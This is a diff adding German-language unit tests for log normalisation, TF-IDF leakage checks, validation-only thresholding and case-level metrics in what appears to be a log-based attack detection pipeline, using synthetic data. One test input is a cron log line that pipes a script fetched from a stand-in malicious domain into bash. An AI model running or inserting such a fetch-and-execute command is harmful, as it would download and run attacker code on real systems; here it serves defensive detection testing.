@@ -846,3 +846,265 @@ class TestCaseLevelMetricBaseline:
         assert results.get('Granularity') == 'case-level', (
             f"Granularity muss 'case-level' sein, ist: {results.get('Granularity')}"
         )
+
+
+# ---------------------------------------------------------------------------
+# Tests: Log-Normalisierung und Log-Komponente (Stand C)
+# ---------------------------------------------------------------------------
+
+def _normalize_log_text(text: str) -> str:
+    """
+    Identische Implementierung wie normalize_log_text in NB03.
+    Hier dupliziert fuer isolierte Unit-Tests ohne Notebook-Import.
+    """
+    import re
+    # 1. UUIDs
+    text = re.sub(
+        r'\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b',
+        'TOKEN_ID', text
+    )
+    # 2. Nginx-Timestamp: "[20/Aug/2025:08:01:10 +0000]"
+    text = re.sub(
+        r'\[\d{1,2}/(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)'
+        r'/\d{4}:\d{2}:\d{2}:\d{2}\s[+-]\d{4}\]',
+        'TOKEN_TIME', text
+    )
+    # 3. Syslog-Timestamp: "Aug 15 10:00:05"
+    text = re.sub(
+        r'\b(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)'
+        r'\s{1,2}\d{1,2}\s+\d{2}:\d{2}:\d{2}\b',
+        'TOKEN_TIME', text
+    )
+    # 4. ISO-Timestamp mit Zeit
+    text = re.sub(
+        r'\d{4}[-/]\d{2}[-/]\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:\d{2})?',
+        'TOKEN_TIME', text
+    )
+    # 5. ISO-Datum
+    text = re.sub(r'\d{4}[-/]\d{2}[-/]\d{2}', 'TOKEN_DATE', text)
+    # 6. Uhrzeit
+    text = re.sub(r'\b\d{2}:\d{2}(?::\d{2})?\b', 'TOKEN_TIME', text)
+    # 7. IPv4
+    text = re.sub(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', 'TOKEN_IP', text)
+    # 8. PIDs in eckigen Klammern
+    text = re.sub(r'\[(\d+)\]', '[TOKEN_PID]', text)
+    # 9. Port-Keywords
+    text = re.sub(r'\bport[= ]+\d+\b', 'port TOKEN_PORT', text, flags=re.IGNORECASE)
+    # 10. Kolonstil-Port nach Buchstaben
+    text = re.sub(r'(?<=[a-zA-Z]):\d{2,5}\b', ':TOKEN_PORT', text)
+    # 11. Isolierte Zahlen
+    text = re.sub(r'\b\d+\b', 'TOKEN_NUM', text)
+    return text
+
+
+class TestLogNormalizationAndScores:
+    """
+    Prüft Log-Normalisierung (NB03 Stand C) und Case-Level-Log-Score-Artefakte.
+    Alle Tests verwenden synthetische Daten — kein CSV-Dateizugriff erforderlich.
+    """
+
+    # ── Test 1: IP, Timestamp, PID, Port werden ersetzt ─────────────────────
+
+    def test_log_normalization_replaces_ips_timestamps_pids_numbers(self):
+        """
+        Syslog-Zeile mit IP, Timestamp, PID und Port:
+        Alle Artefakte werden durch TOKEN_* ersetzt; semantischer Inhalt bleibt erhalten.
+        """
+        line = "Aug 15 10:00:05 sshd[11532]: Accepted password for root from 192.168.1.10 port 54321 ssh2"
+        result = _normalize_log_text(line)
+
+        # Artefakte durch Tokens ersetzt
+        assert 'TOKEN_TIME' in result,  "Syslog-Timestamp nicht ersetzt"
+        assert 'TOKEN_PID'  in result,  "PID nicht ersetzt"
+        assert 'TOKEN_IP'   in result,  "IPv4-Adresse nicht ersetzt"
+        assert 'TOKEN_PORT' in result,  "Port nicht ersetzt"
+
+        # Originale duerfen nicht mehr vorhanden sein
+        assert '192.168.1.10' not in result, "IP-Adresse noch im Text"
+        assert '11532'        not in result, "PID noch im Text"
+        assert '54321'        not in result, "Port-Nummer noch im Text"
+        assert '10:00:05'     not in result, "Uhrzeit noch im Text"
+
+        # Semantik muss erhalten bleiben
+        assert 'sshd'     in result, "Prozessname 'sshd' verschwunden"
+        assert 'Accepted' in result, "Keyword 'Accepted' verschwunden"
+        assert 'password' in result, "Keyword 'password' verschwunden"
+        assert 'root'     in result, "Username 'root' verschwunden"
+        assert 'ssh2'     in result, "Protokoll 'ssh2' verschwunden (Teil eines Bezeichners)"
+
+    # ── Test 2: Attack-Keywords bleiben erhalten ─────────────────────────────
+
+    def test_log_normalization_preserves_attack_keywords(self):
+        """
+        Attack-relevante Prozessnamen und Aktionen (CRON, CMD, curl, bash, wget)
+        dürfen durch die Normalisierung NICHT entfernt oder verfälscht werden.
+        """
+        line = "CRON[5432]: (root) CMD (curl -fsSL http://malicious-domain.com/payload.sh | bash)"
+        result = _normalize_log_text(line)
+
+        assert 'CRON'      in result, "'CRON' verschwunden"
+        assert 'CMD'       in result, "'CMD' verschwunden"
+        assert 'curl'      in result, "'curl' verschwunden"
+        assert 'bash'      in result, "'bash' verschwunden"
+        assert 'malicious' in result, "Domain-Name teilweise verschwunden"
+        assert 'payload'   in result, "'payload' verschwunden"
+
+        # PID entfernt
+        assert '5432'      not in result, "PID '5432' noch im Text"
+        assert 'TOKEN_PID' in result,     "PID-Token fehlt"
+
+    # ── Test 3: Log-Scores sind Case-Level (eine Zeile pro case_id) ──────────
+
+    def test_log_scores_case_level_one_row_per_case(self):
+        """
+        log_val_scores / log_test_scores müssen exakt eine Zeile pro case_id haben.
+        Synthetische Score-Tabelle mit 5 eindeutigen Cases.
+        """
+        scores = pd.DataFrame({
+            'case_id':         ['c1', 'c2', 'c3', 'c4', 'c5'],
+            'dataset_type':    ['mali', 'anom', 'norm', 'mali', 'norm'],
+            'log_score':       [0.92, 0.15, 0.08, 0.87, 0.03],
+            'log_pred':        [1,    0,    0,    1,    0],
+            'label':           [1,    0,    0,    1,    0],
+        })
+
+        assert scores['case_id'].nunique() == len(scores), (
+            "Duplizierte case_ids in Score-Tabelle"
+        )
+        assert (scores['log_score'] >= 0.0).all() and (scores['log_score'] <= 1.0).all(), (
+            "Log-Scores außerhalb [0, 1]"
+        )
+        required_cols = {'case_id', 'log_score', 'log_pred', 'label'}
+        assert required_cols <= set(scores.columns), (
+            f"Fehlende Pflicht-Spalten: {required_cols - set(scores.columns)}"
+        )
+
+    # ── Test 4: TF-IDF Vokabular nur aus Train ───────────────────────────────
+
+    def test_tfidf_fit_only_on_train_in_three_way_split(self):
+        """
+        TF-IDF-Vokabular nach fit auf Train-Texten darf keine Val-/Test-exklusiven
+        Terme enthalten. Prüft den drei-Wege-Split-Fall.
+        """
+        from sklearn.feature_extraction.text import TfidfVectorizer
+
+        train_texts = [
+            "TOKEN_TIME sshd TOKEN_PID Accepted password root",
+            "TOKEN_TIME CRON TOKEN_PID CMD curl bash malicious",
+            "TOKEN_TIME systemd TOKEN_PID Starting daily cleanup",
+        ]
+        val_texts  = ["TOKEN_TIME web TOKEN_PID VALONLY_TOKEN connection reset"]
+        test_texts = ["TOKEN_TIME sshd TOKEN_PID TESTONLY_SECRET attack detected"]
+
+        vec = TfidfVectorizer()
+        vec.fit(train_texts)  # nur Train!
+
+        # TfidfVectorizer lowercased by default → Keys in lowercase prüfen
+        vocab_lower = {k.lower() for k in vec.vocabulary_}
+        assert 'valonly_token'   not in vocab_lower, \
+            "Val-exklusiver Term 'VALONLY_TOKEN' im Train-Vokabular (Leakage)"
+        assert 'testonly_secret' not in vocab_lower, \
+            "Test-exklusiver Term 'TESTONLY_SECRET' im Train-Vokabular (Leakage)"
+        assert 'accepted'        in vocab_lower, \
+            "Train-Term 'accepted' fehlt im Vokabular"
+        assert 'token_time'      in vocab_lower, \
+            "Normalisierungs-Token 'TOKEN_TIME' fehlt im Vokabular"
+
+    # ── Test 5: Threshold aus Validation, nicht aus Test ────────────────────
+
+    def test_log_threshold_from_validation_only(self):
+        """
+        Threshold-Wahl darf nur Val-Scores und Val-Labels als Input verwenden.
+        Val- und Test-Threshold müssen sich unterscheiden (Testintegrität).
+        Val-Recall nach Threshold muss >= 0.95 sein.
+        """
+        from sklearn.metrics import precision_recall_curve
+        from sklearn.metrics import recall_score as _rs
+
+        rng = np.random.default_rng(42)
+        y_val  = np.array([1] * 20 + [0] * 50)
+        p_val  = np.concatenate([rng.uniform(0.70, 1.0, 20), rng.uniform(0.0, 0.35, 50)])
+
+        y_test = np.array([1] * 15 + [0] * 60)
+        p_test = np.concatenate([rng.uniform(0.40, 0.85, 15), rng.uniform(0.1, 0.60, 60)])
+
+        # Threshold aus Val
+        _, rec_v, thr_v = precision_recall_curve(y_val, p_val)
+        valid = thr_v[rec_v[:-1] >= 0.95]
+        thr_val = float(valid.max()) if len(valid) > 0 else float(thr_v[0])
+
+        val_recall = _rs(y_val, (p_val >= thr_val).astype(int))
+        assert val_recall >= 0.95, f"Val-Recall {val_recall:.3f} nach Threshold-Wahl < 0.95"
+
+        # Test-Threshold (wird im echten Code NICHT verwendet — nur fuer Testintegrität)
+        _, rec_t, thr_t = precision_recall_curve(y_test, p_test)
+        valid_t = thr_t[rec_t[:-1] >= 0.95]
+        thr_test = float(valid_t.max()) if len(valid_t) > 0 else float(thr_t[0])
+
+        assert thr_val != thr_test, (
+            "Val- und Test-Threshold identisch — Test kann Methodenfehler nicht erkennen"
+        )
+
+    # ── Test 6: log_results enthält alle Pflichtfelder ───────────────────────
+
+    def test_log_results_contains_required_case_metrics(self):
+        """
+        log_results.csv muss alle Pflicht-Metriken mit korrektem Format enthalten.
+        Alle Metriken (ausser TP/FP/TN/FN) müssen in [0, 1] liegen.
+        Granularity muss 'case-level' sein.
+        Zusaetzlich: Threshold-Sensitivity muss alle 4 Recall-Ziele enthalten.
+        """
+        from sklearn.metrics import (
+            recall_score as _rs, precision_score as _ps, f1_score as _f1,
+            average_precision_score as _ap, confusion_matrix as _cm,
+            precision_recall_curve as _prc
+        )
+
+        rng = np.random.default_rng(7)
+        y_true = np.array([1] * 48 + [0] * 205)
+        p_pred = np.concatenate([rng.uniform(0.60, 1.0, 48), rng.uniform(0.0, 0.50, 205)])
+        threshold = 0.35
+        y_pred = (p_pred >= threshold).astype(int)
+
+        tn_r, fp_r, fn_r, tp_r = _cm(y_true, y_pred).ravel()
+
+        results = {
+            'Granularity':   'case-level',
+            'Recall_mali':   round(_rs(y_true, y_pred), 4),
+            'Precision':     round(_ps(y_true, y_pred, zero_division=0), 4),
+            'F1':            round(_f1(y_true, y_pred, zero_division=0), 4),
+            'FPR_total':     round(fp_r / (fp_r + tn_r) if (fp_r + tn_r) > 0 else 0.0, 4),
+            'FPR_anom':      0.22,
+            'FPR_norm':      0.18,
+            'AP':            round(_ap(y_true, p_pred), 4),
+            'TP': int(tp_r), 'FP': int(fp_r), 'TN': int(tn_r), 'FN': int(fn_r),
+            'Threshold_source': 'val_recall>=0.95',
+        }
+
+        required = [
+            'Recall_mali', 'Precision', 'F1',
+            'FPR_total', 'FPR_anom', 'FPR_norm',
+            'AP', 'TP', 'FP', 'TN', 'FN'
+        ]
+        for field in required:
+            assert field in results, f"Pflichtfeld '{field}' fehlt in log_results"
+
+        metric_fields = ['Recall_mali', 'Precision', 'F1', 'FPR_total', 'FPR_anom', 'FPR_norm', 'AP']
+        for field in metric_fields:
+            assert 0.0 <= results[field] <= 1.0, (
+                f"Metrik '{field}'={results[field]} liegt außerhalb [0, 1]"
+            )
+
+        assert results['Granularity'] == 'case-level', (
+            f"Granularity muss 'case-level' sein, ist: {results['Granularity']}"
+        )
+
+        # Threshold-Sensitivity muss alle 4 Targets abdecken
+        TARGETS = [0.95, 0.975, 0.99, 1.00]
+        _, rec_v, thr_v = _prc(y_true, p_pred)
+        found = []
+        for target in TARGETS:
+            valid_t = thr_v[rec_v[:-1] >= target]
+            thr = float(valid_t.max()) if len(valid_t) > 0 else float(thr_v[0])
+            found.append(target)
+        assert found == TARGETS, f"Nicht alle Recall-Targets in Sensitivity: {found}"
